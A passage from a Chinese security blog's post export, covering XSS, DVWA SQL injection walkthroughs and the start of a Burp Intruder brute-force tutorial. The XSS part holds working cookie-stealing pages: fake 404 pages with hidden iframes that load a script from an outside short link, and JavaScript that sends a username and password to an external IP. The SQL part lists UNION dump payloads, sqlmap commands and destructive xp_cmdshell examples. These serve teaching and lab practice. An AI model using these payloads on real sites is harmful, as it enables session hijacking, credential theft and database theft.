弹框hack,插入的语句被执行； 数据流向：前端--\u0026gt;后端--\u0026gt;前端   6.2 存储型xss  ------------------------------ //前端：2.html \u0026lt;html\u0026gt; \u0026lt;head lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;存储型XSS\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026quot;action2.php\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt; 输入你的ID： \u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;id\u0026quot; /\u0026gt; \u0026lt;br/\u0026gt; 输入你的Name：\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;name\u0026quot; /\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;提交\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ------------------------------- //后端：action2.php \u0026lt;?php $id=$_POST[\u0026quot;id\u0026quot;]; $name=$_POST[\u0026quot;name\u0026quot;]; mysql_connect(\u0026quot;localhost\u0026quot;,\u0026quot;root\u0026quot;,\u0026quot;root\u0026quot;); mysql_select_db(\u0026quot;test\u0026quot;); $sql=\u0026quot;insert into xss value ($id,'$name')\u0026quot;; $result=mysql_query($sql); ?\u0026gt; ------------------------------ //供其他用户访问页面：show2.php \u0026lt;?php mysql_connect(\u0026quot;localhost\u0026quot;,\u0026quot;root\u0026quot;,\u0026quot;root\u0026quot;); mysql_select_db(\u0026quot;test\u0026quot;); $sql=\u0026quot;select * from xss where id=1\u0026quot;; $result=mysql_query($sql); while($row=mysql_fetch_array($result)){ echo $row['name']; } ?\u0026gt; --------------------------------- 这里有一个用户提交的页面,数据交给后端后,后端存储在数据库中。然后当其他用户 访问另一个页面时,后端调出改数据,显示给另一个用户,XSS代码执行。 ----------------------------------- 我们输入1和\u0026lt;script\u0026gt;alert(\\'hack\\')\u0026lt;/script\u0026gt;,注意,这里的hack的单引号要进行转义, 因为sql语句中的$name是单引号的,所以这里不转义的话就会闭合sql语句中的单引号。 ----------------------------------- 当我们提交1和\u0026lt;script\u0026gt;alert(\\'hack\\')\u0026lt;/script\u0026gt;后,XSS代码被插入数据库, 然后当其他用户访问show2.php时,查询id=1,echo $row['name'],xss代码被执行。 ----------------------------------- 数据流向：前端--\u0026gt;后端--\u0026gt;数据库--\u0026gt;后端--\u0026gt;前端   6.3 DOM-xss  ---------------------------------- // 前端3.html \u0026lt;html\u0026gt; \u0026lt;head lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;DOM型XSS\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026quot;action3.php\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;name\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;提交\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ----------------------- // 后端action3.php \u0026lt;?php $name=$_POST[\u0026quot;name\u0026quot;]; ?\u0026gt; \u0026lt;input id=\u0026quot;text\u0026quot; type=\u0026quot;text\u0026quot; value=\u0026quot;\u0026lt;?php echo $name; ?\u0026gt;\u0026quot;/\u0026gt; \u0026lt;div id=\u0026quot;print\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt; var text=document.getElementById(\u0026quot;text\u0026quot;); var print=document.getElementById(\u0026quot;print\u0026quot;); print.innerHTML=text.value; // 获取 text的值,并且输出在print内。这里是导致xss的主要原因。 \u0026lt;/script\u0026gt; ------------------------------ 这是一个用户提交页面,用户可以在此提交数据,数据提交后给后台处理： ------------------------------ 提交数据：\u0026lt;img src=1 οnerrοr=alert('hack')\u0026gt; ,弹窗hack ------------------------------ 数据流向：前端--\u0026gt;浏览器   7. XSS的简单绕过滤和绕过  ---------------------------------- 1.区分大小写过滤标签： 过滤：$name=preg_replace(\u0026quot;/\u0026lt;script\u0026gt;/\u0026quot;,\u0026quot;\u0026quot;,$name); //过滤\u0026lt;script\u0026gt; $name=preg_replace(\u0026quot;/\u0026lt;\\/script\u0026gt;/\u0026quot;,\u0026quot;\u0026quot;,$name); //过滤\u0026lt;/script\u0026gt; 绕过：可以使用大小写绕过 \u0026lt;scripT\u0026gt;alert('hack')\u0026lt;/scripT\u0026gt; ---------------------------------- 2.不区分大小写过滤标签：/i：不区分大小写 过滤：$name=preg_replace(\u0026quot;/\u0026lt;script\u0026gt;/i\u0026quot;,\u0026quot;\u0026quot;,$name); //不区分大小写过滤 \u0026lt;script\u0026gt; $name=preg_replace(\u0026quot;/\u0026lt;\\/script\u0026gt;/i\u0026quot;,\u0026quot;\u0026quot;,$name); //不区分大小写过滤 \u0026lt;/script\u0026gt; 绕过：可以使用嵌套的script标签绕过：\u0026lt;scr\u0026lt;script\u0026gt;ipt\u0026gt;alert('hack')\u0026lt;/scr\u0026lt;/script\u0026gt;ipt\u0026gt; ---------------------------------- 3.不区分大小写,过滤之间的所有内容： 过滤：$name = preg_replace( '/\u0026lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); //过滤了\u0026lt;script 及其之间的所有内容 绕过：虽然无法使用\u0026lt;script\u0026gt;标签注入XSS代码,但是可以通过img、body等标签的事件 或者iframe等标签的 rc注入恶意的js代码。 \u0026lt;img src=1 οnerrοr=alert('hack')\u0026gt; ------------------------------------   8. 反射型XSS的利用优势 假设现在有一个网站存在反射型XSS,当用户登录该网站时,我们通过诱使用户点击我们精心制作的恶意连接,来盗取用户\n的cookie并返回给我们,然后我们通过盗取的cookie以用户的身份登录该网站。\n ------------------------------------ get型： 当我们的输入参数的请求类型为get型时,即我们的输入参数是以URL方式提交； 该链接的为：http://127.0.0.1/vulnerabilities/xss_r/?name=\u0026lt;script\u0026gt;alert(/xss/)\u0026lt;/script\u0026gt; 思考：怎么构造恶意代码用来诱使用户点击并且用户点击后不会发现点击了恶意链接呢？ -------------------------------- 构造代码： 核心：\u0026lt;iframe src=\u0026quot;http://127.0.0.1/vulnerabilities/xss_r/?name=\u0026lt;script src=https://t.cn/EtxZt8T\u0026gt;\u0026lt;/script\u0026gt;\u0026quot; style=\u0026quot;display:none;\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; ---------------------------- \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026quot;Content-Type\u0026quot; content=\u0026quot;text/html; charset=UTF-8\u0026quot;\u0026gt; \u0026lt;meta http-equiv=\u0026quot;X-UA-Compatible\u0026quot; content=\u0026quot;IE=edge,chrome=1\u0026quot;\u0026gt; \u0026lt;title\u0026gt;404 页面不存在 \u0026lt;/title\u0026gt; \u0026lt;style type=\u0026quot;text/css\u0026quot;\u0026gt; body{font:14px/1.5 'Microsoft YaHei','微软雅黑',Helvetica,Sans-serif;min-width:1200px;background:#f0f1f3;} .error-page{background:#f0f1f3;padding:80px 0 180px} .error-page-main{position:relative;background:#f9f9f9;margin:0 auto;width:617px;-ms-box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:50px 50px 70px} .error-page-main h3{font-size:24px;font-weight:400;border-bottom:1px solid #d0d0d0} .error-page-main h3 strong{font-size:54px;font-weight:400;margin-right:20px} \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe src=\u0026quot;http://127.0.0.1/vulnerabilities/xss_r/?name=\u0026lt;script src=https://t.cn/EtxZt8T\u0026gt;\u0026lt;/script\u0026gt;\u0026quot; style=\u0026quot;display:none;\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;div class=\u0026quot;error-page\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;error-page-container\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;error-page-main\u0026quot;\u0026gt; \u0026lt;h3\u0026gt; \u0026lt;strong\u0026gt;404\u0026lt;/strong\u0026gt;很抱歉,您要访问的页面不存在！ \u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ------------------------------ 将其保存为html页面,然后放在我们自己的服务器上,作为一个链接。当用户登录了存在漏洞的网站,并且用户点击了 我们构造的恶意链接时,该链接页面会偷偷打开一个iframe框架,iframe会访问其中的链接,然后执行我们的js代码。 该js代码会把存在漏洞的网站的cookie发送到我们的平台上,而用户却浑然不知,只会获得一个404错误页面。 注：我们的攻击代码可以利用的前提是存在XSS漏洞的网站的X-Frame-options未配置,并且会话Cookie没有设置Http Only属性 ======================================= post型 假设一网站的用户名输入框存在反射型XSS漏洞： 构造代码： ------------------------------- \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026quot;Content-Type\u0026quot; content=\u0026quot;text/html; charset=UTF-8\u0026quot;\u0026gt; \u0026lt;meta http-equiv=\u0026quot;X-UA-Compatible\u0026quot; content=\u0026quot;IE=edge,chrome=1\u0026quot;\u0026gt; \u0026lt;title\u0026gt;404 页面不存在 \u0026lt;/title\u0026gt; \u0026lt;style type=\u0026quot;text/css\u0026quot;\u0026gt; body{font:14px/1.5 'Microsoft YaHei','微软雅黑',Helvetica,Sans-serif;min-width:1200px;background:#f0f1f3;} .error-page{background:#f0f1f3;padding:80px 0 180px} .error-page-main{position:relative;background:#f9f9f9;margin:0 auto;width:617px;-ms-box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:50px 50px 70px} .error-page-main h3{font-size:24px;font-weight:400;border-bottom:1px solid #d0d0d0} .error-page-main h3 strong{font-size:54px;font-weight:400;margin-right:20px} \u0026lt;/style\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt; function attack() { document.getElementById(\u0026quot;transfer\u0026quot;).submit(); } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe src=\u0026quot;form.html\u0026quot; frameborder=\u0026quot;0\u0026quot; style=\u0026quot;display: none\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;div class=\u0026quot;error-page\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;error-page-container\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;error-page-main\u0026quot;\u0026gt; \u0026lt;h3\u0026gt; \u0026lt;strong\u0026gt;404\u0026lt;/strong\u0026gt;很抱歉,您要访问的页面不存在！ \u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;form method=\u0026quot;POST\u0026quot; id=\u0026quot;transfer\u0026quot; action=\u0026quot;http://127.0.0.1/xss/action.php\u0026quot; target=\u0026quot;frameName\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;username\u0026quot; value=\u0026quot;\u0026lt;script src=https://t.cn/EtxZt8T\u0026gt;\u0026lt;/script\u0026gt;\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;password\u0026quot; value=\u0026quot;1\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;iframe src=\u0026quot;\u0026quot; frameborder=\u0026quot;0\u0026quot; name=\u0026quot;frameName\u0026quot; style=\u0026quot;display: none\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ------------------------------------//form表单target属性：指定框架打开的位置 将其保存为html页面,然后放在我们自己的服务器上,作为一个链接。当用户登录了存在漏洞的网站,并且用户点击了 我们构造的恶意链接时,该链接页面会偷偷打开一个iframe框架,iframe会访问其中的链接,然后执行我们的js代码, 完成表单的提交,表单的用户名参数是我们的js代码。提交完该表单后,该js代码会把存在漏洞的网站的cookie发送到 我们的平台上,单用户却浑然不知,只会获得一个404错误页面。 这里的404页面中隐藏了一个form提交表单,为了防止提交表单后跳转,在表单中添加一个iframe框架,并且iframe框架 的name等于form表单的target,并且设置iframe框架不可见。 当用户点击我们构造的恶意链接时,发现是一个404页面。实际上这个页面偷偷地进行了页面的提交,提交到了我们 指定的平台位置。   9. 利用js将用户信息发送给后台  构造代码： -------------------------------------- \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026quot;https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; $(function(){ //我们现在假如 user和pass是我们利用js获得的用户的用户名和密码 user=\u0026quot;admin\u0026quot;; pass=\u0026quot;root\u0026quot;; url=\u0026quot;http://120.79.74.249:8080/?user=\u0026quot;+user+\u0026quot;\u0026amp;pass=\u0026quot;+pass; var frame=$(\u0026quot;\u0026lt;iframe\u0026gt;\u0026quot;); frame.attr(\u0026quot;src\u0026quot;,url); frame.attr(\u0026quot;style\u0026quot;,\u0026quot;display:none\u0026quot;); $(\u0026quot;#body\u0026quot;).append(frame); //添加一个iframe框架,并设置不显示。这个框架会偷偷访问该链接。 }); \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body id=\u0026quot;body\u0026quot;\u0026gt; \u0026lt;h3\u0026gt;hello,word!\u0026lt;/h3\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ------------------------------------- 当用户访问了该页面,我们后台就可以看到用户访问记录。   ","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/xss%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/","tags":["漏洞原理"],"title":"XSS漏洞详解"},{"content":"定义 SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。\n手工注入思路 自动化的注入神器sqlmap固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入（非盲注）的步骤。\n 1.判断是否存在注入，注入是字符型还是数字型\n2.猜解SQL查询语句中的字段数\n3.查询哪些字段可以正常回显在页面上\n4.获取当前数据库\n5.获取数据库中的表\n6.获取表中的字段名\n7.下载数据\n 漏洞利用 现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。\n漏洞危害 这里转载自一位大佬的博客：点击\n 数据表中的数据外泄，例如企业及个人机密数据，账户数据，密码等。 数据结构被黑客探知，得以做进一步攻击（例如SELECT * FROM sys.tables）。 数据库服务器被攻击，系统管理员账户被窜改（例如ALTER LOGIN sa WITH PASSWORD=’xxxxxx’）。 获取系统较高权限后，有可能得以在网页加入恶意链接、恶意代码以及Phishing等。 经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如xp_cmdshell “net stop iisadmin”可停止服务器的IIS服务）。 黑客经由上传php简单的指令至对方之主机内，PHP之强大系统命令，可以- - 让黑客进行全面控制系统(例如:php一句话木马)。 破坏硬盘数据，瘫痪全系统（例如xp_cmdshell “FORMAT C:”）。 获取系统最高权限后，可针对企业内部的任一管理系统做大规模破坏，甚至让其企业倒闭。 企业网站主页被窜改，门面尽失。  Low 贴一下代码\n\u0026lt;?php if( isset( $_REQUEST[ 'Submit' ] ) ) { // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = \u0026quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';\u0026quot;; $result = mysql_query( $query ) or die( '\u0026lt;pre\u0026gt;' . mysql_error() . '\u0026lt;/pre\u0026gt;' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i \u0026lt; $num ) { // Get values $first = mysql_result( $result, $i, \u0026quot;first_name\u0026quot; ); $last = mysql_result( $result, $i, \u0026quot;last_name\u0026quot; ); // Feedback for end user echo \u0026quot;\u0026lt;pre\u0026gt;ID: {$id}\u0026lt;br /\u0026gt;First name: {$first}\u0026lt;br /\u0026gt;Surname: {$last}\u0026lt;/pre\u0026gt;\u0026quot;; // Increase loop count $i++; } mysql_close(); } ?\u0026gt;  1、判断是否存在注入，注入是字符型还是数字型\n输入1，查询成功：\n输入1',报错\n报错内容You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1\n从'1''可以看出存在字符型注入\n输入1' # 正确查询出了内容，更证明了是字符型注入\n上面是采取注释掉后面单引号的方式\n现在我们试一下去主动闭合单引号，输入1' or '1'='1\n2、拆解SQL查询语句中的字段数\n输入1' or 1=1 order by 1 #,查询成功\n输入1' or 1=1 order by 2 #,查询成功\n输入1' or 1=1 order by 3 #,查询失败\n说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。\n3、查询哪些字段可以正常回显在页面上\n输入1' union select 1,2 #，查询成功：\nPS：union select 后面的数字应该和order by 查出的字段一致\n4.获取当前数据库\n输入1' union select 1,database() #，查询成功：\n说明当前的数据库为dvwa。\n5.获取数据库中的表\n输入1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：\n说明数据库dvwa中一共有两个表，guestbook与users。\n6.获取表中的字段名\n输入1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #，查询成功：\n说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。\n7.下载数据\n输入1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：\n这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。\nLow级别就怎么完了？\n不可能滴，前面提到了==SQLMAP==这个神器，何不一试\n说搞就搞\n1、首先我们进入界面，随意输入user id进行测试，然后按F12获取提交时的url（或者使用抓包工具抓取）\nURL：\nhttp://192.168.138.128/DVWA-master/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit #\n2、使用sqlmap检测是否存在注入点\n输入命令 ：\npython sqlmap.py -u \u0026quot;http://192.168.138.128/DVWA-master/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit\u0026quot;#  可以看到对获取到的url进行检测后，会302重定向到登录的url，说明我们检测的url必须带有登录权限才能验证，因此我们的命令中需要带上登录dvwa后的cookie信息。\n调整命令后再次检测：\npython sqlmap.py -u \u0026quot;http://192.168.138.128/DVWA-master/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit\u0026quot; --cookie=\u0026quot;security=low; PHPSESSID=2mcr71ntvn40l57l8miligshm5\u0026quot; --dbs  检测出来了\n3、查看当前链接的数据库\n输入命令\npython sqlmap.py -u \u0026quot;http://192.168.138.128/DVWA-master/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit\u0026quot;# --cookie=\u0026quot;security=low; PHPSESSID=2mcr71ntvn40l57l8miligshm5\u0026quot; --batch --current-db  4、获取当前数据库中的所有数据表\n输入命令：\npython sqlmap.py -u \u0026quot;http://192.168.138.128/DVWA-master/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit\u0026quot;# --cookie=\u0026quot;security=low; PHPSESSID=2mcr71ntvn40l57l8miligshm5\u0026quot; -D dvwa --tables  5、我们查看user表中的所有列\n输入命令\npython sqlmap.py -u \u0026quot;http://192.168.138.128/DVWA-master/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit\u0026quot;# --cookie=\u0026quot;security=low; PHPSESSID=2mcr71ntvn40l57l8miligshm5\u0026quot; -D dvwa -T users --columns  可以很明显的看出user和password是我们需要的信息\n6、导出指定数据表中指定的列\n输入命令\npython sqlmap.py -u \u0026quot;http://192.168.138.128/DVWA-master/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit\u0026quot;# --cookie=\u0026quot;security=low; PHPSESSID=2mcr71ntvn40l57l8miligshm5\u0026quot; -D dvwa -T users --columns -D dvwa -T users -C \u0026quot;user,password\u0026quot; --dump  现在我们只要任取一组在登录页面验证即可。\nMedium 贴一下代码\n\u0026lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $id = $_POST[ 'id' ]; $id = mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $id); $query = \u0026quot;SELECT first_name, last_name FROM users WHERE user_id = $id;\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $query) or die( '\u0026lt;pre\u0026gt;' . mysqli_error($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) . '\u0026lt;/pre\u0026gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Display values $first = $row[\u0026quot;first_name\u0026quot;]; $last = $row[\u0026quot;last_name\u0026quot;]; // Feedback for end user echo \u0026quot;\u0026lt;pre\u0026gt;ID: {$id}\u0026lt;br /\u0026gt;First name: {$first}\u0026lt;br /\u0026gt;Surname: {$last}\u0026lt;/pre\u0026gt;\u0026quot;; } } // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query = \u0026quot;SELECT COUNT(*) FROM users;\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $query ) or die( '\u0026lt;pre\u0026gt;' . ((is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_error($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u0026lt;/pre\u0026gt;' ); $number_of_rows = mysqli_fetch_row( $result )[0]; mysqli_close($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]); ?\u0026gt;  可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号\n\\x00,\\n,\\r,,',\u0026quot;,\\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。\n漏洞利用\n虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。\n1.判断是否存在注入，注入是字符型还是数字型\n抓包更改参数id为1' or 1=1 #\n报错：\n抓包更改参数id为1 or 1=1 #，查询成功：\n说明存在数字型注入。\n（由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。）\n2.猜解SQL查询语句中的字段数\n抓包更改参数id为1 order by 2 #，查询成功：\n抓包更改参数id为1 order by 3 #，报错：\n说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。\n3.查询哪些字段可以正常回显在页面上\n抓包更改参数id为1 union select 1,2 #，查询成功：\n4.获取当前数据库\n抓包更改参数id为1 union select 1,database() #，查询成功：\n5.获取数据库中的表\n抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：\n得到数据库dvwa中一共有两个表，guestbook与users。\n6.获取表中的字段名\n抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：\n这是因为单引号被转义了，变成了\\’。\n可以利用16进制进行绕过，抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #，查询成功\n得到users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。\n7.下载数据\n抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：\n这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。\nHigh 先放一下代码\n\u0026lt;?php if( isset( $_SESSION [ 'id' ] ) ) { // Get input $id = $_SESSION[ 'id' ]; // Check database $query = \u0026quot;SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $query ) or die( '\u0026lt;pre\u0026gt;Something went wrong.\u0026lt;/pre\u0026gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[\u0026quot;first_name\u0026quot;]; $last = $row[\u0026quot;last_name\u0026quot;]; // Feedback for end user echo \u0026quot;\u0026lt;pre\u0026gt;ID: {$id}\u0026lt;br /\u0026gt;First name: {$first}\u0026lt;br /\u0026gt;Surname: {$last}\u0026lt;/pre\u0026gt;\u0026quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]))) ? false : $___mysqli_res); } ?\u0026gt;  可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1,并且为字符型注入，希望以此控制只输出一个结果。\n漏洞利用\n虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。\n输入1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：\n需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。\nimpossible 贴一下代码\n\u0026lt;?php if( isset( $_GET[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $id = $_GET[ 'id' ]; // Was a number entered? if(is_numeric( $id )) { // Check the database $data = $db-\u0026gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data-\u0026gt;bindParam( ':id', $id, PDO::PARAM_INT ); $data-\u0026gt;execute(); $row = $data-\u0026gt;fetch(); // Make sure only 1 result is returned if( $data-\u0026gt;rowCount() == 1 ) { // Get values $first = $row[ 'first_name' ]; $last = $row[ 'last_name' ]; // Feedback for end user echo \u0026quot;\u0026lt;pre\u0026gt;ID: {$id}\u0026lt;br /\u0026gt;First name: {$first}\u0026lt;br /\u0026gt;Surname: {$last}\u0026lt;/pre\u0026gt;\u0026quot;; } } } // Generate Anti-CSRF token generateSessionToken(); ?\u0026gt;  可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/dvwasql%E6%B3%A8%E5%85%A5/","tags":["DVWA"],"title":"从DVWA看(SQL Injection)SQL注入"},{"content":" Brute Force  前置知识 Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击。\n暴力破解可分为两种，一种是针对性的密码爆破，另外一种是扩展性的密码喷洒。\n1、密码爆破：密码爆破一般很熟悉，即针对单个账号或用户，用密码字典来不断的尝试，直到试出正确的密码，破解出来的时间和密码的复杂度及长度及破解设备有一定的关系。\n常用的字典文件主要有以下类型：\n 常用的账号密码，例如top100密码字典、top500用户名字典等 互联网上被拖库后的账号密码，比如当年csdn泄露的600w用户信息 使用工具软件按照指定的规则进行排列算法生成的字典，比如生日字典等  2、密码喷洒：密码喷洒和密码爆破相反，也可以叫反向密码爆破，即用指定的一个密码来批量的试取用户，在信息搜集阶段获取了大量的账号信息或者系统的用户，然后以固定的一个密码去不断的尝试这些用户。\n这里需要用到 burp suite 的intruder模块\n这里先介绍一下这个模块\n这里的话借鉴大佬的博客写的十分详细：点击\n一、简介\nBurp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。\nBurp Intruder主要有四个模块组成:\n1、Target 用于配置目标服务器进行攻击的详细信息。 2、Positions 设置Payloads的插入点以及攻击类型（攻击模式） 3、Payloads 设置payload，配置字典 4、Opetions 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。\n1：Target 目标选项(Target tab)\n这个选项是用来配置目标服务器的细节：\n配置这些详细信息的最简单方法是选择要在Burp Suite中攻击任何地方的请求，并在上下文菜单上选择“Send to Intruder”选项。这将把所选的请求发送到Intruder中的新选项卡，并自动填充目标和位置选项卡。\n这里的话说一下SSL\nSSL(Secure Socket Layer 安全套接层)是基于HTTPS下的一个协议加密层, 简而言之，它是一项标准技术，可确保互联网连接安全，保护两个系统之间发送的任何敏感数据，防止网络犯罪分子读取和修改任何传输信息，包括个人资料。两个系统可能是指服务器和客户端（例如，浏览器和购物网站），或两个服务器之间\n2：Positions 位置选项(Positions tab)\n这个选项是用来配置在攻击里产生的所有 HTTP 请求的模板：\n攻击类型\u0026quot;Attack type\u0026quot;\n 